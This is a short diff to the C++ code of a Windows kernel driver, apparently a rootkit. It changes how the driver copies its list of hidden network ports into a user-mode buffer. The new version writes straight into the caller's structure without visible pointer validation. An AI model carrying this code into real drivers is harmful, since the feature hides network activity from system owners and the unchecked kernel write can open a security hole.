@@ -197,7 +197,6 @@ bool NetworkHandler::ListHiddenPorts(_Inout_ IoctlHiddenPorts* hiddenPorts) cons
 	PLIST_ENTRY currentEntry = nullptr;
 	SIZE_T count = 0;
 	HiddenPorts hiddenPortsList;
-	NTSTATUS status = STATUS_SUCCESS;
 
 	if (!hiddenPorts)
 		return false;
@@ -229,29 +228,8 @@ bool NetworkHandler::ListHiddenPorts(_Inout_ IoctlHiddenPorts* hiddenPorts) cons
 		HiddenPort* item = CONTAINING_RECORD(currentEntry, HiddenPort, Entry);
 
 		if (item) {
-			status = WriteProcessMemory(
-				&item->Port,
-				PsGetCurrentProcess(),
-				&hiddenPorts->Ports[count].Port,
-				sizeof(USHORT),
-				UserMode);
-
-			if (!NT_SUCCESS(status)) {
-				hiddenPorts->Count = count;
-				return false;
-			}
-
-			status = WriteProcessMemory(
-				&item->Remote,
-				PsGetCurrentProcess(),
-				&hiddenPorts->Ports[count].Remote,
-				sizeof(USHORT),
-				UserMode);
-
-			if (!NT_SUCCESS(status)) {
-				hiddenPorts->Count = count;
-				return false;
-			}
+			hiddenPorts->Ports[count].Port = item->Port;
+			hiddenPorts->Ports[count].Remote = item->Remote;
 		}
 		count++;
 		currentEntry = currentEntry->Flink;
